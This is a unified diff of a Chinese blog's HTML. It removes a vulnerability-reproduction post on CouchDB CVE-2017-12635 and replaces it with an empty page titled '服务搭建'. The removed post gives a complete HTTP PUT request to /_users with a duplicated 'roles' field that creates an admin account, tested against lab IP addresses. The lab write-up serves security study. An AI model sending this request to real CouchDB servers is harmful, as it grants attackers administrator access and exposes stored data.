@@ -16,9 +16,9 @@
   
   
   
-    <meta name="description" content="漏洞原理：Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。在2017年11月...">
+    <meta name="description" content>
   
-  <title>CouchDB 未授权访问漏洞CVE-2017-12635 [ liu ]</title>
+  <title>服务搭建 [ liu ]</title>
   
   
     <link rel="shortcut icon" href="/hollow.ico">
@@ -37,24 +37,6 @@
 <body>
 <div class="side-navigate hide-area">
   
-    <div class="item prev">
-      <a href="/2019/07/10/1 day/9/">
-        <div class="item-icon"></div>
-      </a>
-      <div class="item-title">
-        Nginx 文件名逻辑漏洞（CVE-2013-4547）
-      </div>
-    </div>
-  
-  
-    <div class="item next">
-      <a href="/2019/07/05/1 day/7/">
-        <div class="item-icon"></div>
-      </a>
-      <div class="item-title">
-        DNS域传送漏洞
-      </div>
-    </div>
   
 </div>
 <div id="outer-container" class="hide-area">
@@ -94,7 +76,7 @@
           </li>
         
           
-            <li>
+            <li class="active">
           
             <a href="/categories">Categories</a>
             
@@ -126,74 +108,21 @@
     <div id="content-inner">
       
       
-  
-
-  <article id="post">
-    <h1>CouchDB 未授权访问漏洞CVE-2017-12635</h1>
-    <p class="page-title-sub">
-      <span id="post-title-date">Created at 2019-07-10</span>
-      
-        <span id="post-title-updated">Updated at 2019-08-03</span>
-      
-      
-      <span id="post-title-categories">Category
-      
-      
-        
-        
-        <a href="/categories/漏洞复现/">漏洞复现</a>
-      
-      </span>
-      
-      
-      <span id="post-title-tags">
-      Tag
-      
-      
-        
-        
-        <a href="/tags/CouchDB-未授权访问漏洞CVE-2017-12635/">CouchDB 未授权访问漏洞CVE-2017-12635</a>
-      
-      </span>
-      
-    </p>
+  <article id="page">
     
-    <hr>
-<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>&emsp;<br>影响版本：小于 1.7.0 以及 小于 2.1.1<br>&emsp;<br>&emsp;</p>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217:5984<br>攻击者：192.168.199.187</p>
-<ol>
-<li>首先访问一下靶机</li>
-</ol>
-<p><a href="https://imgchr.com/i/eBTdC8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBTdC8.png" alt="eBTdC8.png"></a><br>暴漏出couchdb的版本信息等<br>访问<a href="http://192.168.199.151:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.151:5984/_utils/</a></p>
-<p><a href="https://imgchr.com/i/eBHJtP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBHJtP.png" alt="eBHJtP.png"></a><br>选择登陆账户：admin，密码：password<br>登陆进去可以看到别人创建的用户密码等数据库<br>&emsp;<br>&emsp;</p>
-<ol start="2">
-<li>使用burpsuite进行抓包并修改请求内容</li>
-</ol>
-<p><a href="https://imgchr.com/i/eBqKZd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqKZd.png" alt="eBqKZd.png"></a><br>修改请求为PUT并创建用户和密码，在user这个数据库中创建账号和密码<br>PUT /_users/org.couchdb.user:liupanpan HTTP/1.1<br>Host: 192.168.199.217:5984<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>If-Modified-Since: Sat, 02 Dec 2017 17:49:09 GMT<br>Connection: close<br>Content-Length: 108</p>
-<p>{<br>  “type”: “user”,<br>  “name”: “liupanpan”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “lpp”<br>}</p>
-<p><a href="https://imgchr.com/i/eBqNLQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqNLQ.png" alt="eBqNLQ.png"></a><br>&emsp;<br>访问下图页面</p>
-<p><a href="https://imgchr.com/i/eBqrWV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqrWV.png" alt="eBqrWV.png"></a><br>发现创建成功<br>&emsp;<br>&emsp;</p>
-
+    
+      <h1 class>服务搭建</h1>
+      
+      
+    
   </article>
-  <div class="random-toc-area">
-  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
-  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
-  <div class="random-toc">
-    <h2>Table of Content</h2>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol>
-  </div>
-</div>
 
   
 <nav id="pagination">
   
-    <a href="/2019/07/10/1 day/9/" class="prev">&larr; Prev post Nginx 文件名逻辑漏洞（CVE-2013-4547）</a>
-  
 
   
 
-  
-    <a href="/2019/07/05/1 day/7/" class="next">Next post DNS域传送漏洞 &rarr;</a>
   
 </nav>
 
